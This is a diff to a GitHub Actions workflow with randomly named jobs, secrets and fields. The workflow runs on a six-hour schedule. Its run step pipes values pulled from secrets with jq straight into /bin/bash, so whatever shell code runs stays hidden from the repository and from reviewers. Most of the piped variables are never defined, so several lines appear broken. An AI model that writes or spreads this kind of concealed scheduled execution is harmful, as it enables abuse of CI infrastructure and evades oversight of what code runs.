@@ -3,19 +3,23 @@ name: flowerywhizz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 1/6 * * *'
+    - cron: '56 1/6 * * *'
 
-jobs:  # 2896
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: flowerywhizz
         env:
-          ryqlm2801: ${{ secrets.ryqlm2801 }}
+          r226: ${{ secrets.r226 }}
         run: |
-          echo $ryqlm2801 | jq -r .q44 | /bin/bash
-          echo $icg59 | jq -r .kjqjj8 | /bin/bash
-          echo $ai87 | jq -r .xq67 | /bin/bash
-          echo $w49 | jq -r .vrrvg65933 | /bin/bash
+          echo $r226 | jq -r .tnv45 | /bin/bash
+          echo $ioi69748 | jq -r .tb71 | /bin/bash
+          echo $k461 | jq -r .tcq282 | /bin/bash
+          echo $l045 | jq -r .mceg684 | /bin/bash
+          echo $ufdh17762 | jq -r .sm6602 | /bin/bash
+          echo $xch4787 | jq -r .atdh0773 | /bin/bash
+          echo $kaxna9128 | jq -r .ww73765 | /bin/bash
 
